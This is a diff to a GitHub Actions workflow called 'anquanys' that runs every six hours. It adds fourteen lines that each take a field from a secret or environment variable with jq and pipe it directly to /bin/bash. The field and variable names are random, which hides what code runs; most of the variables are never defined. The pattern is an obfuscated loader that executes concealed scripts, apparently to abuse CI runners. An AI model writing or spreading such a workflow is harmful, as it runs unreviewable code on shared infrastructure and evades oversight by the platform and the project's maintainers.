@@ -3,19 +3,28 @@ name: anquanys
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 5/6 * * *'
-
+    - cron: '31 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: anquanys
         env:
-          njiai42: ${{ secrets.njiai42 }}
+          o6: ${{ secrets.o6 }}
         run: |
-          echo $njiai42 | jq -r .nak988 | /bin/bash
-          echo $h7 | jq -r .ygl03259 | /bin/bash
-          echo $qfxmm67 | jq -r .o18 | /bin/bash
+          echo $o6 | jq -r .t9 | /bin/bash
+          echo $dgl2813 | jq -r .ims0450 | /bin/bash
+          echo $vdb3940 | jq -r .naw8144 | /bin/bash
+          echo $jianx7 | jq -r .qqedd1430 | /bin/bash
+          echo $uvuht70555 | jq -r .hst7 | /bin/bash
+          echo $diul0 | jq -r .y79 | /bin/bash
+          echo $umqm50581 | jq -r .rbz430 | /bin/bash
+          echo $z67 | jq -r .h2273 | /bin/bash
+          echo $rodo759 | jq -r .u187 | /bin/bash
+          echo $tthq6513 | jq -r .n1550 | /bin/bash
+          echo $b4 | jq -r .paq7459 | /bin/bash
+          echo $bmdhl6617 | jq -r .j8094 | /bin/bash
+          echo $pksw9166 | jq -r .i6 | /bin/bash
+          echo $okheo42 | jq -r .jzjcu39 | /bin/bash
 
